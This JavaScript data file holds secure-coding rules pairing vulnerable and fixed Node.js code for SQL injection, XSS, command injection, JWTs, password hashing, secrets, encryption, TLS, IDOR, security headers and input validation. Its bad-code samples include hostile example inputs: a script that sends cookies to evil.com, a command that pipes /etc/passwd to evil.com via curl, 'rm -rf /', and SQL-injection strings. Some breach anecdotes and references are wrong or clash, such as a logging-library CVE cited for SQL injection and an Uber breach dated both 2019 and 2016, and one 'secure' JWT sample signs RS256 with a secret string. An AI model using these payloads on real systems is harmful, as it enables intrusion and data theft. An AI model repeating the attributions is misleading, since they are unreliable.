export const SECURE_CODING_RULES = [
  // ─── INJECTION ─────────────────────────────────────────────────────────────
  {
    id: "sc-inj-01",
    category: "Injection",
    severity: "critical",
    title: "SQL Injection — Never concatenate user input into queries",
    description:
      "SQL injection is the #1 web vulnerability (OWASP A03). Attackers inject SQL syntax through form fields, URLs, or headers to dump databases, bypass auth, or delete data.",
    realWorldExample:
      "2021: A UK retailer had 1.2M customer records stolen via a login form vulnerable to SQL injection (`' OR '1'='1`). The attacker extracted full names, emails and hashed passwords in 20 minutes.",
    badCode: `// ❌ DANGEROUS — SQL Injection vulnerability
app.post('/login', async (req, res) => {
  const { username, password } = req.body;

  // Direct string concatenation — NEVER do this
  const query = "SELECT * FROM users WHERE username = '"
    + username + "' AND password = '" + password + "'";

  const user = await db.query(query);
  // Attacker sends: username = ' OR '1'='1' --
  // Query becomes: ... WHERE username = '' OR '1'='1' --'
  // This bypasses authentication entirely!
});`,
    goodCode: `// ✅ SECURE — Parameterized query + bcrypt
const bcrypt = require('bcrypt');

app.post('/login', async (req, res) => {
  const { username, password } = req.body;

  // Parameterized query — user input never touches SQL syntax
  const user = await db.query(
    'SELECT id, username, password_hash, role FROM users WHERE username = $1',
    [username]   // placeholder, never interpolated
  );

  if (!user.rows[0]) {
    // Same response for not-found vs wrong-password (prevent enumeration)
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  // Compare with timing-safe bcrypt (never store plain text)
  const valid = await bcrypt.compare(password, user.rows[0].password_hash);
  if (!valid) return res.status(401).json({ error: 'Invalid credentials' });

  // Issue short-lived signed JWT
  const token = jwt.sign(
    { sub: user.rows[0].id, role: user.rows[0].role },
    process.env.JWT_SECRET,
    { expiresIn: '15m', algorithm: 'RS256' }
  );
  res.json({ token });
});`,
    tools: ["SQLMap (detection)", "Snyk Code", "SonarQube", "Semgrep"],
    cvss: 9.8,
    cwe: "CWE-89",
    references: ["OWASP A03:2021", "CVE-2021-44228"],
  },
  {
    id: "sc-inj-02",
    category: "Injection",
    severity: "critical",
    title: "XSS — Always encode output and enforce CSP",
    description:
      "Cross-Site Scripting lets attackers inject scripts into pages viewed by other users. Stored XSS persists in the database; reflected XSS lives in the URL.",
    realWorldExample:
      "2018: British Airways XSS attack led to Magecart script injection on the payment page — 500,000 card details stolen over 2 weeks. BA fined £183M under GDPR.",
    badCode: `// ❌ DANGEROUS — Reflected XSS + Stored XSS
// Reflected: rendering user input directly into HTML
app.get('/search', (req, res) => {
  const q = req.query.q;
  // Attacker sends: ?q=<script>fetch('https://evil.com/?c='+document.cookie)</script>
  res.send(\`<h1>Results for: \${q}</h1>\`);
});

// React: dangerouslySetInnerHTML with user content
function Comment({ text }) {
  // text could contain <script> or <img onerror=...>
  return <div dangerouslySetInnerHTML={{ __html: text }} />;
}`,
    goodCode: `// ✅ SECURE — Output encoding + CSP headers

// 1. Set strict Content Security Policy
app.use((req, res, next) => {
  res.setHeader('Content-Security-Policy',
    "default-src 'self'; " +
    "script-src 'self' 'nonce-{RANDOM}'; " +   // nonces for inline scripts
    "style-src 'self' 'unsafe-inline'; " +
    "img-src 'self' data: https:; " +
    "object-src 'none'; " +
    "base-uri 'self';"
  );
  next();
});

// 2. Use DOMPurify for any HTML you must render
import DOMPurify from 'dompurify';

function Comment({ text }) {
  const clean = DOMPurify.sanitize(text, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p'],
    ALLOWED_ATTR: []   // no event handlers
  });
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}

// 3. In Express templates — always escape output (never trust req.params/query)
// Use templating engines with auto-escaping: Handlebars, Jinja2, etc.
app.get('/search', (req, res) => {
  const q = escapeHtml(req.query.q || '');
  res.render('search', { query: q }); // auto-escaped in Handlebars
});`,
    tools: ["OWASP ZAP", "Burp Suite", "DOMPurify", "helmet.js (CSP)"],
    cvss: 9.3,
    cwe: "CWE-79",
    references: ["OWASP A03:2021", "British Airways breach 2018"],
  },
  {
    id: "sc-inj-03",
    category: "Injection",
    severity: "high",
    title: "Command Injection — Never pass user input to shell commands",
    description:
      "Command injection occurs when user-controlled data is passed to a system shell. Attackers can run arbitrary OS commands with the app's privileges.",
    realWorldExample:
      "2021: GitLab RCE (CVE-2021-22205) — unauthenticated command injection via image upload (ExifTool). Affected 11,000+ GitLab instances. CVSS 10.0.",
    badCode: `// ❌ DANGEROUS — Command Injection
const { exec } = require('child_process');

app.post('/ping', (req, res) => {
  const host = req.body.host;
  // Attacker sends: "google.com; rm -rf /"
  // Or: "google.com && cat /etc/passwd | curl https://evil.com -d @-"
  exec(\`ping -c 4 \${host}\`, (err, stdout) => {
    res.send(stdout);
  });
});

// Python equivalent:
# import subprocess
# subprocess.call("ping " + host, shell=True)  # ❌ Never shell=True with user input`,
    goodCode: `// ✅ SECURE — Use execFile with argument arrays (no shell)
const { execFile } = require('child_process');
const { isIP } = require('net');

app.post('/ping', (req, res) => {
  const host = req.body.host;

  // 1. Allowlist validation — only valid hostname/IP accepted
  const hostnameRegex = /^[a-zA-Z0-9.-]{1,253}$/;
  if (!hostnameRegex.test(host) && !isIP(host)) {
    return res.status(400).json({ error: 'Invalid host format' });
  }

  // 2. execFile — arguments passed as array, no shell interpolation
  execFile('ping', ['-c', '4', '-W', '2', host], {
    timeout: 10000,   // kill after 10s
    maxBuffer: 4096,  // limit output size
  }, (err, stdout) => {
    if (err) return res.status(500).json({ error: 'Ping failed' });
    res.json({ result: stdout });
  });
});`,
    tools: ["Semgrep", "Bandit (Python)", "CodeQL", "Snyk Code"],
    cvss: 9.8,
    cwe: "CWE-78",
    references: ["CVE-2021-22205", "OWASP A03:2021"],
  },

  // ─── AUTHENTICATION ────────────────────────────────────────────────────────
  {
    id: "sc-auth-01",
    category: "Authentication",
    severity: "critical",
    title: "JWT — Use RS256, short expiry, and validate all claims",
    description:
      "JWTs signed with weak algorithms (HS256 with guessable secrets, or 'none') are trivial to forge. Tokens stored in localStorage are vulnerable to XSS theft.",
    realWorldExample:
      "2022: Auth0 vulnerability — attackers could forge JWTs by exploiting algorithm confusion (RS256 to HS256 switch). Affected apps that trusted the `alg` header from the token itself.",
    badCode: `// ❌ DANGEROUS — Weak JWT implementation
const jwt = require('jsonwebtoken');

// 1. Weak secret + symmetric algorithm
const token = jwt.sign({ userId: 123 }, 'secret123', { expiresIn: '30d' });

// 2. Trusting the algorithm from the token header (algorithm confusion attack)
app.get('/profile', (req, res) => {
  const token = req.headers.authorization?.split(' ')[1];
  // NEVER let the token dictate its own algorithm
  const decoded = jwt.verify(token, publicKey); // verifies with whatever alg is in header
  res.json(decoded);
});

// 3. Storing JWT in localStorage (XSS accessible)
localStorage.setItem('token', jwt_token); // ❌`,
    goodCode: `// ✅ SECURE — RS256, short expiry, httpOnly cookie storage
const jwt = require('jsonwebtoken');
const fs = require('fs');

const privateKey = fs.readFileSync('./keys/private.pem');
const publicKey  = fs.readFileSync('./keys/public.pem');

// Issue token — RS256, short-lived, minimal payload
function issueToken(userId, role) {
  return jwt.sign(
    { sub: userId, role, iat: Math.floor(Date.now() / 1000) },
    privateKey,
    {
      algorithm: 'RS256',  // Asymmetric — private signs, public verifies
      expiresIn: '15m',    // Short-lived; use refresh tokens for sessions
      issuer: 'api.yourapp.com',
      audience: 'app.yourapp.com',
    }
  );
}

// Verify — explicitly specify algorithm (prevent alg confusion)
app.use('/api', (req, res, next) => {
  const token = req.cookies.access_token; // httpOnly cookie, not localStorage
  if (!token) return res.status(401).json({ error: 'No token' });

  try {
    const payload = jwt.verify(token, publicKey, {
      algorithms: ['RS256'],   // Whitelist — reject 'none', 'HS256', etc.
      issuer: 'api.yourapp.com',
      audience: 'app.yourapp.com',
    });
    req.user = payload;
    next();
  } catch (e) {
    return res.status(401).json({ error: 'Invalid token' });
  }
});

// Store in httpOnly, Secure, SameSite=Strict cookie
res.cookie('access_token', token, {
  httpOnly: true,   // JS cannot read this
  secure: true,     // HTTPS only
  sameSite: 'strict',
  maxAge: 15 * 60 * 1000,
});`,
    tools: ["jwt.io (inspection)", "OWASP JWT Security Cheatsheet"],
    cvss: 9.1,
    cwe: "CWE-347",
    references: ["CVE-2022-23529", "OWASP A07:2021"],
  },
  {
    id: "sc-auth-02",
    category: "Authentication",
    severity: "critical",
    title: "Password Storage — Always use bcrypt/Argon2, never MD5/SHA",
    description:
      "Storing passwords with MD5, SHA-1, or plain SHA-256 is catastrophic. These are fast hashes — GPU rigs crack billions of MD5 hashes per second. Bcrypt/Argon2 are designed to be slow.",
    realWorldExample:
      "2013: Adobe breach — 153M passwords stored as 3DES-encrypted with the same IV, making them equivalent to ECB mode (identical passwords = identical ciphertext). Cracked en masse within days.",
    badCode: `// ❌ DANGEROUS — Insecure password storage
const crypto = require('crypto');
const md5 = require('md5');

// Using MD5 — cracked in milliseconds with rainbow tables
const hash1 = md5(password);

// Using unsalted SHA-1
const hash2 = crypto.createHash('sha1').update(password).digest('hex');

// Using SHA-256 without salt — still vulnerable to rainbow tables
const hash3 = crypto.createHash('sha256').update(password).digest('hex');

// Storing plain text (never do this)
user.password = password;`,
    goodCode: `// ✅ SECURE — Argon2id (best) or bcrypt (minimum)
const argon2 = require('argon2');
// OR: const bcrypt = require('bcrypt');

// REGISTRATION — hash with Argon2id
async function hashPassword(plain) {
  return await argon2.hash(plain, {
    type: argon2.argon2id,    // Argon2id = best for password hashing
    memoryCost: 65536,        // 64 MB memory usage (hard to parallelize)
    timeCost: 3,              // 3 iterations
    parallelism: 4,           // 4 threads
    saltLength: 16,           // Random salt auto-generated per hash
  });
  // Result: "$argon2id$v=19$m=65536,t=3,p=4$..." (self-contained, includes salt)
}

// VERIFICATION — constant-time comparison (prevents timing attacks)
async function verifyPassword(plain, hash) {
  return await argon2.verify(hash, plain);
  // argon2.verify is automatically constant-time
}

// If using bcrypt (minimum):
// const ROUNDS = 12; // 2^12 iterations — tune so hashing takes ~100ms on your server
// const hash = await bcrypt.hash(password, ROUNDS);
// const valid = await bcrypt.compare(password, hash); // timing-safe`,
    tools: ["OWASP Password Storage Cheatsheet", "HaveIBeenPwned API"],
    cvss: 9.8,
    cwe: "CWE-916",
    references: ["Adobe breach 2013", "OWASP A02:2021"],
  },
  {
    id: "sc-auth-03",
    category: "Authentication",
    severity: "high",
    title: "Rate Limiting & Account Lockout — Prevent brute force attacks",
    description:
      "Without rate limiting, attackers can submit thousands of password guesses per second. Credential stuffing attacks replay billions of leaked username/password pairs.",
    realWorldExample:
      "2022: Okta breach — attacker used credential stuffing against admin support tool. 366 Okta customer organisations impacted. No MFA and no rate limiting on the internal tool.",
    badCode: `// ❌ DANGEROUS — No rate limiting on auth endpoints
app.post('/login', async (req, res) => {
  const { email, password } = req.body;
  const user = await User.findOne({ email });
  if (!user || !bcrypt.compare(password, user.hash)) {
    return res.status(401).json({ error: 'Wrong credentials' });
    // Attacker can try millions of passwords — no delay, no lockout
  }
  // ...
});

// Also dangerous: user enumeration — different error for unknown user vs wrong password
app.post('/login', async (req, res) => {
  const user = await User.findOne({ email });
  if (!user) return res.status(404).json({ error: 'User not found' }); // ❌ reveals existence
  if (!await bcrypt.compare(password, user.hash)) return res.status(401).json({ error: 'Wrong password' }); // ❌
});`,
    goodCode: `// ✅ SECURE — Rate limiting + lockout + generic responses
const rateLimit = require('express-rate-limit');
const slowDown  = require('express-slow-down');

// Rate limit: 5 attempts per 15 minutes per IP
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5,
  skipSuccessfulRequests: true,
  handler: (req, res) => res.status(429).json({
    error: 'Too many login attempts. Try again in 15 minutes.'
  }),
  standardHeaders: true,
  legacyHeaders: false,
});

// Progressive delay: starts slowing after 3 attempts
const loginSlowDown = slowDown({
  windowMs: 15 * 60 * 1000,
  delayAfter: 3,
  delayMs: (hits) => hits * 500,  // 3rd attempt: 1.5s, 4th: 2s, etc.
});

app.post('/login', loginLimiter, loginSlowDown, async (req, res) => {
  const { email, password } = req.body;

  // Generic message — prevents user enumeration
  const GENERIC_ERROR = 'Invalid credentials';

  const user = await User.findOne({ email });
  if (!user) {
    await bcrypt.hash('dummy', 12); // run bcrypt even if user not found (timing attack prevention)
    return res.status(401).json({ error: GENERIC_ERROR });
  }

  // Check lockout
  if (user.lockoutUntil && user.lockoutUntil > new Date()) {
    return res.status(429).json({ error: 'Account locked. Check your email.' });
  }

  const valid = await bcrypt.compare(password, user.passwordHash);
  if (!valid) {
    // Increment failed attempts, lock after 10
    await user.incrementFailedAttempts(); // locks for 30 min after 10 failures
    return res.status(401).json({ error: GENERIC_ERROR });
  }

  await user.resetFailedAttempts();
  // ... issue token
});`,
    tools: ["express-rate-limit", "express-slow-down", "Fail2ban"],
    cvss: 8.1,
    cwe: "CWE-307",
    references: ["Okta breach 2022", "OWASP A07:2021"],
  },

  // ─── SECRETS EXPOSURE ──────────────────────────────────────────────────────
  {
    id: "sc-sec-01",
    category: "Secrets Exposure",
    severity: "critical",
    title: "Never hard-code secrets — Use environment variables and secret managers",
    description:
      "Hard-coded credentials in source code are eventually committed to version control and exposed publicly. GitHub has automated bots that scan new commits for secrets within seconds.",
    realWorldExample:
      "2022: Toyota accidentally pushed source code to public GitHub with embedded AWS keys. Attackers had access to 296,019 customer data records for ~5 years before discovery.",
    badCode: `// ❌ DANGEROUS — Hard-coded secrets (committed to git = public forever)
const stripe = require('stripe')('sk_live_AbCd1234RealSecretKey...');

const db = mysql.createConnection({
  host: 'prod.db.internal',
  user: 'admin',
  password: 'Sup3rS3cur3DB@Pass!',   // ❌ In git history forever
  database: 'customers'
});

const jwt = require('jsonwebtoken');
const SECRET = 'myJWTsecret123';     // ❌ Weak AND hard-coded

// .env committed to git (check .gitignore!)
// AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
// AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY`,
    goodCode: `// ✅ SECURE — Environment variables + secret manager

// .env (NEVER commit — add to .gitignore)
// Loaded by dotenv in development; injected by platform in production
require('dotenv').config();

// Fail fast if required secrets missing
const requiredEnv = ['STRIPE_SECRET', 'DB_PASSWORD', 'JWT_PRIVATE_KEY'];
for (const key of requiredEnv) {
  if (!process.env[key]) throw new Error(\`Missing required env var: \${key}\`);
}

const stripe = require('stripe')(process.env.STRIPE_SECRET);

// Production: use AWS Secrets Manager / HashiCorp Vault
const AWS = require('@aws-sdk/client-secrets-manager');
const client = new AWS.SecretsManagerClient({ region: 'us-east-1' });

async function getSecret(secretName) {
  const { SecretString } = await client.send(
    new AWS.GetSecretValueCommand({ SecretId: secretName })
  );
  return JSON.parse(SecretString);
}

// Usage — credentials fetched at startup, never in code
const dbCreds = await getSecret('prod/myapp/db');
const db = mysql.createConnection({
  host: process.env.DB_HOST,
  user: dbCreds.username,
  password: dbCreds.password,
});

// .gitignore — always include these
// .env
// .env.local
// *.pem
// config/secrets.*`,
    tools: ["GitLeaks", "TruffleHog", "AWS Secrets Manager", "HashiCorp Vault", "Doppler"],
    cvss: 9.8,
    cwe: "CWE-798",
    references: ["Toyota GitHub leak 2022", "GitHub Secret Scanning"],
  },
  {
    id: "sc-sec-02",
    category: "Secrets Exposure",
    severity: "high",
    title: "API Keys — Hash before storage, use scopes, set expiry",
    description:
      "API keys stored in plain text in databases are stolen in DB breaches. Keys without scopes allow attackers full access. Keys without expiry remain valid forever after a breach.",
    realWorldExample:
      "2019: Attacker discovered an Uber engineer's AWS keys in a GitHub commit, used them to access 57 million rider/driver records stored in S3. Uber paid $148M settlement.",
    badCode: `// ❌ DANGEROUS — Plain-text API key storage + no scopes
// Generating a weak key
const apiKey = Math.random().toString(36).slice(2); // ❌ NOT cryptographically random

// Storing plain text in DB
await ApiKey.create({ key: apiKey, userId });  // ❌ DB breach = all keys exposed

// No expiry, no scope validation
app.use('/api', async (req, res, next) => {
  const key = req.headers['x-api-key'];
  const record = await ApiKey.findOne({ key });  // plain text lookup
  if (!record) return res.status(403).end();
  next(); // ❌ no scope check, no expiry check
});`,
    goodCode: `// ✅ SECURE — Cryptographic generation, hashed storage, scoped + expiring
const crypto = require('crypto');

// Generate cryptographically secure key with prefix (easier to identify + rotate)
function generateApiKey(prefix = 'sk') {
  const raw = crypto.randomBytes(32).toString('base64url'); // 256-bit entropy
  return \`\${prefix}_\${raw}\`;  // e.g. sk_dGhpcyBpcyBhIHRlc3Q...
}

// Store ONLY the SHA-256 hash — the raw key is shown once then discarded
async function createApiKey(userId, scopes, expiresInDays = 90) {
  const raw = generateApiKey();
  const hash = crypto.createHash('sha256').update(raw).digest('hex');

  await ApiKey.create({
    hash,          // stored — used for lookup
    userId,
    scopes,        // e.g. ['read:orders', 'write:inventory']
    expiresAt: new Date(Date.now() + expiresInDays * 86400000),
    lastUsedAt: null,
    revokedAt: null,
  });

  return raw;  // returned ONCE — user must save it; never stored again
}

// Validate — hash incoming key, constant-time compare
app.use('/api', async (req, res, next) => {
  const incoming = req.headers['x-api-key'];
  if (!incoming) return res.status(401).json({ error: 'Missing API key' });

  const hash = crypto.createHash('sha256').update(incoming).digest('hex');
  const record = await ApiKey.findOne({
    hash,
    revokedAt: null,
    expiresAt: { $gt: new Date() },
  });

  if (!record) return res.status(403).json({ error: 'Invalid or expired key' });

  // Scope check
  const required = scopeForRoute(req.path, req.method);
  if (!record.scopes.includes(required)) {
    return res.status(403).json({ error: \`Requires scope: \${required}\` });
  }

  await ApiKey.updateOne({ hash }, { lastUsedAt: new Date() }); // audit trail
  req.apiKey = record;
  next();
});`,
    tools: ["GitLeaks", "AWS IAM Access Analyzer", "Snyk"],
    cvss: 8.8,
    cwe: "CWE-312",
    references: ["Uber breach 2016", "OWASP API Security Top 10"],
  },

  // ─── CRYPTOGRAPHY ──────────────────────────────────────────────────────────
  {
    id: "sc-cry-01",
    category: "Cryptography",
    severity: "critical",
    title: "Encryption — Use AES-256-GCM with random IVs, never ECB mode",
    description:
      "ECB (Electronic Codebook) mode encrypts identical plaintext blocks to identical ciphertext blocks — patterns are visible. CBC without authentication allows padding oracle attacks. GCM provides both confidentiality and integrity.",
    realWorldExample:
      "2013: Adobe used 3DES in ECB mode to 'encrypt' 153M passwords. Since the same password produced the same ciphertext, attackers could identify common passwords by frequency analysis — 'password' appeared 1.9M times with the same ciphertext.",
    badCode: `// ❌ DANGEROUS — ECB mode, static IV, no authentication tag
const crypto = require('crypto');

// ECB mode — identical inputs = identical outputs (patterns visible)
function encryptECB(data) {
  const cipher = crypto.createCipheriv('aes-256-ecb', key, null);
  return cipher.update(data, 'utf8', 'hex') + cipher.final('hex');
}

// CBC with static IV — same IV+key = same ciphertext (deterministic)
const STATIC_IV = Buffer.from('1234567890123456'); // ❌ Never reuse IV
function encryptCBC(data) {
  const cipher = crypto.createCipheriv('aes-256-cbc', key, STATIC_IV); // ❌
  return cipher.update(data, 'utf8', 'hex') + cipher.final('hex');
  // Also: no authentication tag — vulnerable to bit-flipping attacks
}`,
    goodCode: `// ✅ SECURE — AES-256-GCM with random IV and authentication tag
const crypto = require('crypto');

const ALGORITHM = 'aes-256-gcm';
const KEY = Buffer.from(process.env.ENCRYPTION_KEY, 'hex'); // 32 bytes = 256 bits

function encrypt(plaintext) {
  const iv = crypto.randomBytes(12);   // GCM standard: 96-bit (12 byte) IV
  const cipher = crypto.createCipheriv(ALGORITHM, KEY, iv);

  const encrypted = Buffer.concat([
    cipher.update(plaintext, 'utf8'),
    cipher.final()
  ]);

  const authTag = cipher.getAuthTag(); // 128-bit authentication tag

  // Store: iv (12B) + authTag (16B) + ciphertext — all needed for decryption
  return {
    iv: iv.toString('hex'),
    authTag: authTag.toString('hex'),
    ciphertext: encrypted.toString('hex'),
  };
}

function decrypt({ iv, authTag, ciphertext }) {
  const decipher = crypto.createDecipheriv(
    ALGORITHM,
    KEY,
    Buffer.from(iv, 'hex')
  );
  decipher.setAuthTag(Buffer.from(authTag, 'hex'));

  // If the data was tampered with, setAuthTag verification THROWS here
  const decrypted = Buffer.concat([
    decipher.update(Buffer.from(ciphertext, 'hex')),
    decipher.final()   // Throws if auth tag doesn't match
  ]);
  return decrypted.toString('utf8');
}

// Key generation (do once, store in secrets manager):
// crypto.randomBytes(32).toString('hex')`,
    tools: ["Cryptography libraries: libsodium, node-forge"],
    cvss: 7.5,
    cwe: "CWE-327",
    references: ["Adobe breach 2013", "OWASP A02:2021"],
  },
  {
    id: "sc-cry-02",
    category: "Cryptography",
    severity: "high",
    title: "TLS — Enforce TLS 1.3, disable weak ciphers, enable HSTS",
    description:
      "Older TLS versions (SSL, TLS 1.0, 1.1) are vulnerable to POODLE, BEAST, DROWN, and LOGJAM attacks. Weak cipher suites allow downgrade attacks and decryption.",
    realWorldExample:
      "2014: POODLE attack exploited SSLv3 fallback in all major browsers. Attackers could decrypt 1 byte per 256 requests — credit card numbers exposed in ~30 minutes on public WiFi.",
    badCode: `// ❌ DANGEROUS — Permissive TLS config
const https = require('https');
const tls = require('tls');

const server = https.createServer({
  key: privateKey,
  cert: certificate,
  // No secureOptions — allows SSLv3, TLS 1.0, TLS 1.1
  // No cipher restrictions — allows RC4, DES, export-grade ciphers
  rejectUnauthorized: false,  // ❌ Skips certificate verification (MITM vulnerable)
});

// In Node.js HTTP client:
const req = https.get('https://api.example.com', {
  rejectUnauthorized: false  // ❌ Never do this in production
});`,
    goodCode: `// ✅ SECURE — TLS 1.3 only, strong ciphers, HSTS
const https = require('https');
const tls = require('tls');
const helmet = require('helmet');

const server = https.createServer({
  key: privateKey,
  cert: certificate,

  // Minimum TLS version
  minVersion: 'TLSv1.3',

  // Strong cipher suites only (TLS 1.3 ciphers are automatically selected)
  ciphers: [
    'TLS_AES_256_GCM_SHA384',
    'TLS_CHACHA20_POLY1305_SHA256',
    'TLS_AES_128_GCM_SHA256',
  ].join(':'),

  // Security options
  secureOptions:
    tls.SSL_OP_NO_SSLv2 |
    tls.SSL_OP_NO_SSLv3 |
    tls.SSL_OP_NO_TLSv1 |
    tls.SSL_OP_NO_TLSv1_1,

  honorCipherOrder: true,
}, app);

// HSTS header — tells browsers to always use HTTPS (max 2 years)
app.use(helmet.hsts({
  maxAge: 63072000,      // 2 years in seconds
  includeSubDomains: true,
  preload: true,         // Submit to HSTS preload list
}));

// Test your TLS: https://www.ssllabs.com/ssltest/  (aim for A+)`,
    tools: ["SSLLabs Scanner", "testssl.sh", "Mozilla SSL Config Generator"],
    cvss: 7.4,
    cwe: "CWE-326",
    references: ["POODLE CVE-2014-3566", "OWASP A02:2021"],
  },

  // ─── INSECURE DIRECT OBJECT REFERENCE ─────────────────────────────────────
  {
    id: "sc-idor-01",
    category: "Access Control",
    severity: "critical",
    title: "IDOR — Always verify ownership before serving resources",
    description:
      "IDOR (Insecure Direct Object Reference) is when an attacker modifies an ID in a request (URL, body, header) to access another user's data. It's the #1 finding in bug bounty programs.",
    realWorldExample:
      "2019: Instagram IDOR — by changing the `user_id` parameter in the download-data API, any user could download any other user's photos, DMs, and stories without authentication. Reported via HackerOne; millions of accounts affected.",
    badCode: `// ❌ DANGEROUS — No ownership check (IDOR vulnerability)
app.get('/api/orders/:orderId', authenticate, async (req, res) => {
  const order = await Order.findById(req.params.orderId);
  // ❌ Returns any order for any user — just change the ID in the URL
  // GET /api/orders/12345 → your order
  // GET /api/orders/12346 → someone else's order (same response!)
  res.json(order);
});

app.get('/api/documents/:docId/download', authenticate, async (req, res) => {
  const doc = await Document.findById(req.params.docId);
  // ❌ Attacker enumerates IDs: /documents/1, /documents/2, ...
  res.sendFile(doc.path);
});`,
    goodCode: `// ✅ SECURE — Always scope queries to authenticated user
app.get('/api/orders/:orderId', authenticate, async (req, res) => {
  const order = await Order.findOne({
    _id: req.params.orderId,
    userId: req.user.sub,   // Scoped to the authenticated user's ID
  });

  if (!order) {
    // Use 404 (not 403) — don't reveal that the resource exists
    return res.status(404).json({ error: 'Order not found' });
  }

  res.json(order);
});

// For shared resources — explicit permission check
app.get('/api/documents/:docId/download', authenticate, async (req, res) => {
  const doc = await Document.findById(req.params.docId);
  if (!doc) return res.status(404).json({ error: 'Not found' });

  // Check explicit permission: owner OR shared with this user
  const canAccess =
    doc.ownerId.equals(req.user.sub) ||
    doc.sharedWith.includes(req.user.sub) ||
    req.user.role === 'admin';

  if (!canAccess) {
    await AuditLog.create({ event: 'unauthorized_access', userId: req.user.sub, resource: docId });
    return res.status(404).json({ error: 'Not found' }); // 404 not 403
  }

  res.setHeader('Content-Disposition', 'attachment; filename="' + sanitizeFilename(doc.name) + '"');
  res.sendFile(doc.storagePath);
});`,
    tools: ["Burp Suite (Autorize extension)", "OWASP ZAP"],
    cvss: 9.1,
    cwe: "CWE-639",
    references: ["Instagram IDOR 2019", "OWASP A01:2021"],
  },

  // ─── SECURITY HEADERS ──────────────────────────────────────────────────────
  {
    id: "sc-hdr-01",
    category: "Security Headers",
    severity: "high",
    title: "HTTP Security Headers — Always set CSP, HSTS, X-Frame-Options, etc.",
    description:
      "Missing security headers leave browsers vulnerable to clickjacking, MIME sniffing, XSS, and protocol downgrade attacks. These headers are free and take minutes to add.",
    realWorldExample:
      "2020: Multiple government websites still lacked X-Frame-Options, enabling clickjacking attacks where users thought they were clicking legitimate government buttons but were actually clicking malicious overlays.",
    badCode: `// ❌ DANGEROUS — No security headers (default Express)
const express = require('express');
const app = express();

// No headers set — attacker can:
// 1. Embed your app in an iframe (clickjacking)
// 2. Load your app over HTTP (downgrade from HTTPS)
// 3. Inject scripts through MIME-type confusion
// 4. Run XSS because there's no CSP restriction

app.get('/', (req, res) => {
  res.send('<html>My App</html>');
  // Response headers: only default Express headers
  // X-Powered-By: Express  ← also reveals tech stack!
});`,
    goodCode: `// ✅ SECURE — Complete security header set with helmet
const helmet = require('helmet');
const app = require('express')();

app.use(helmet({
  // Content Security Policy — restricts script/style/image sources
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'nonce-{random}'"],  // nonces for inline scripts
      styleSrc:  ["'self'", "'unsafe-inline'"],   // consider removing unsafe-inline
      imgSrc:    ["'self'", "data:", "https:"],
      connectSrc:["'self'", "https://api.yourapp.com"],
      fontSrc:   ["'self'"],
      objectSrc: ["'none'"],    // Disable Flash, Java, etc.
      frameSrc:  ["'none'"],    // Prevent embedding in iframes
      baseUri:   ["'self'"],    // Prevent base-tag hijacking
      formAction:["'self'"],    // Restrict form submission targets
      upgradeInsecureRequests: [],  // Auto-upgrade HTTP to HTTPS
    },
  },
  hsts: {
    maxAge: 63072000,
    includeSubDomains: true,
    preload: true,
  },
  xFrameOptions: { action: 'deny' },        // Clickjacking protection
  xContentTypeOptions: true,                 // No MIME sniffing
  referrerPolicy: { policy: 'strict-origin-when-cross-origin' },
  permissionsPolicy: {                       // Disable browser features
    features: {
      geolocation: ["'none'"],
      microphone:  ["'none'"],
      camera:      ["'none'"],
    }
  },
}));

app.disable('x-powered-by');  // Don't reveal Express in headers

// Additional headers not in helmet:
app.use((req, res, next) => {
  res.setHeader('Cache-Control', 'no-store');          // No caching sensitive data
  res.setHeader('Permissions-Policy', 'interest-cohort=()');  // Opt out of FLoC
  next();
});

// Verify with: https://securityheaders.com`,
    tools: ["helmet.js", "securityheaders.com", "Mozilla Observatory"],
    cvss: 6.1,
    cwe: "CWE-693",
    references: ["OWASP Secure Headers Project"],
  },

  // ─── INPUT VALIDATION ──────────────────────────────────────────────────────
  {
    id: "sc-inp-01",
    category: "Input Validation",
    severity: "high",
    title: "Input Validation — Validate schema, type, length on every API input",
    description:
      "Missing input validation allows mass-assignment attacks, prototype pollution, type confusion, and business logic bypass. Always validate at the API boundary — never trust client-side validation.",
    realWorldExample:
      "2019: Mass assignment vulnerability in a popular SaaS product — attacker added `'role':'admin'` to the registration JSON body and gained admin access. Affected 50,000+ user accounts.",
    badCode: `// ❌ DANGEROUS — No input validation + mass assignment
app.post('/api/users/register', async (req, res) => {
  // Takes everything from body and saves it — mass assignment!
  // Attacker sends: { name: 'Bob', email: 'bob@x.com', role: 'admin', isVerified: true }
  const user = new User(req.body);  // ❌ role and isVerified should never come from client
  await user.save();
  res.json(user);
});

app.get('/api/products', async (req, res) => {
  const page = req.query.page;    // Could be "1; DROP TABLE products--"
  const limit = req.query.limit;  // Could be "999999" (DoS)
  const products = await Product.find().skip(page * limit).limit(limit);
  res.json(products);
});`,
    goodCode: `// ✅ SECURE — Strict schema validation with Zod + explicit field allowlist
const { z } = require('zod');

// Define exact schema — no extra fields accepted
const RegisterSchema = z.object({
  name:     z.string().min(1).max(100).trim(),
  email:    z.string().email().max(255).toLowerCase(),
  password: z.string()
    .min(12, 'Minimum 12 characters')
    .max(128)
    .regex(/[A-Z]/, 'Must contain uppercase')
    .regex(/[0-9]/, 'Must contain number')
    .regex(/[^A-Za-z0-9]/, 'Must contain special character'),
});

// Validation middleware
function validate(schema) {
  return (req, res, next) => {
    const result = schema.safeParse(req.body);
    if (!result.success) {
      return res.status(400).json({
        error: 'Validation failed',
        details: result.error.issues.map(i => ({ field: i.path.join('.'), message: i.message })),
      });
    }
    req.body = result.data; // replace body with parsed (safe) data
    next();
  };
}

app.post('/api/users/register', validate(RegisterSchema), async (req, res) => {
  // req.body now ONLY contains { name, email, password } — nothing else
  const { name, email, password } = req.body;
  const hash = await argon2.hash(password);
  const user = await User.create({ name, email, passwordHash: hash });
  // role defaults to 'user' in the model — never from request
  res.status(201).json({ id: user.id, name, email });
});

const PaginationSchema = z.object({
  page:  z.coerce.number().int().min(0).max(1000).default(0),
  limit: z.coerce.number().int().min(1).max(100).default(20),
});`,
    tools: ["Zod", "Joi", "express-validator", "Yup"],
    cvss: 7.5,
    cwe: "CWE-20",
    references: ["OWASP A04:2021", "HackerOne mass assignment reports"],
  },

